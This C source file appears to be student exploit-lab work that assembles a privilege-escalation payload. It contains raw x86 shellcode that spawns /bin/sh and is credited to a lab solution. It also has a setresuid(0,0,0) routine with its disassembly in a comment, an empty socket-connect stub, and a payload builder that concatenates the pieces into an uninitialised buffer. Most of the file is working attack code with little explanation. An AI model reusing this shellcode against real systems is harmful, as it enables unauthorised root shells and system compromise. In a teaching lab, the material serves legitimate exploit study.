#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#define	BLENGTH	128

char* 
connectSocket()
{

	return "";
}

char*
setuidRoot()
{
	uid_t ruid, euid, suid;
	setresuid(0, 0, 0);
	printf("%d\n",getresuid(&ruid, &euid, &suid));
	/*
080484d0 <setuidRoot>:
 80484d0:	55                   	push   %ebp
 80484d1:	31 d2                	xor    %edx,%edx
 80484d3:	89 e5                	mov    %esp,%ebp
 80484d5:	31 c0                	xor    %eax,%eax
 80484d7:	83 ec 18             	sub    $0x18,%esp
 80484da:	89 54 24 08          	mov    %edx,0x8(%esp)
 80484de:	89 44 24 04          	mov    %eax,0x4(%esp)
 80484e2:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 80484e9:	e8 a2 fe ff ff       	call   8048390 <setresuid@plt>
 80484ee:	8d 45 fc             	lea    -0x4(%ebp),%eax
 80484f1:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484f5:	8d 45 f8             	lea    -0x8(%ebp),%eax
 80484f8:	89 44 24 04          	mov    %eax,0x4(%esp)
 80484fc:	8d 45 f4             	lea    -0xc(%ebp),%eax
 80484ff:	89 04 24             	mov    %eax,(%esp)
 8048502:	e8 e9 fe ff ff       	call   80483f0 <getresuid@plt>
 8048507:	89 44 24 04          	mov    %eax,0x4(%esp)
 804850b:	c7 04 24 68 86 04 08 	movl   $0x8048668,(%esp)
 8048512:	e8 89 fe ff ff       	call   80483a0 <printf@plt>
 8048517:	c9                   	leave  
 8048518:	b8 6b 86 04 08       	mov    $0x804866b,%eax
 804851d:	c3                   	ret    
 804851e:	66 90                	xchg   %ax,%ax

	*/
	return "";
}


/**
 From lab 6 solution to part C, by Darragh O'Brien
 launches a shell
*/
char*
launchShell()
{

	return 	"\xeb\x12\x5e\x31\xc0\x88\x46\x07"
			"\x50\x56\x31\xd2\x89\xe1\x89\xf3"
			"\xb0\x0b\xcd\x80\xe8\xe9\xff\xff"
			"\xff\x2f\x62\x69\x6e\x2f\x73\x68";
}

void
payload()
{
	char* hexPayload = (char*) malloc(BLENGTH);
	
	strcat(hexPayload, connectSocket());
	strcat(hexPayload, setuidRoot());
	strcat(hexPayload, launchShell());
	printf("%s\n", hexPayload);
}

int main()
{
	payload();
	return 0;
}
